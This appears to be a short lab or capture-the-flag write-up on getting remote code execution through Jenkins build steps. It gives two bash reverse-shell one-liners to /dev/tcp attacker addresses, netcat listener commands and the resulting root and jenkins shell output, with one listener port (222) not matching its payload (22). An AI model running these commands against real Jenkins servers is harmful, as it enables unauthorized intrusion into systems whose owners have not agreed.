
## PoC

After logging in and accessing Jenkins I navigated to Manage Jenkins > System > Scrolled Down to Shell.

Apparently we can run executable scripts here. So I navigated to the /tmp directory and created an malicious .sh script which should spawn us with an reverse shell.

```
$ cat shell.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/22 0>&1'
```

Started up my listener on port 22.

```
nc -lvnp 222
```

I navigated to Item > Entered an Project Name > Pressed on Freestyle Project and Okey > Pressed Build Now

Gained RCE as user "root".

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.127.103] 44946
bash: cannot set terminal process group (48037): Inappropriate ioctl for device
bash: no job control in this shell
root@vmdak:~/.jenkins/workspace/dwqdqw#
```

---

# Another Method

1. Press on New Item > Give it Name > Scroll Down and select Shell

2. Put reverse shell inside

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.70/9000 0>&1'
```

3. Started up listener on port 9000

```
nc -lvnp 9000
```

4. Saved it and started build --> Gained RCE

```
rlwrap nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.70] from (UNKNOWN) [10.10.110.3] 55608
bash: cannot set terminal process group (1315): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@DANTE-NIX07:~/workspace/pwned$
```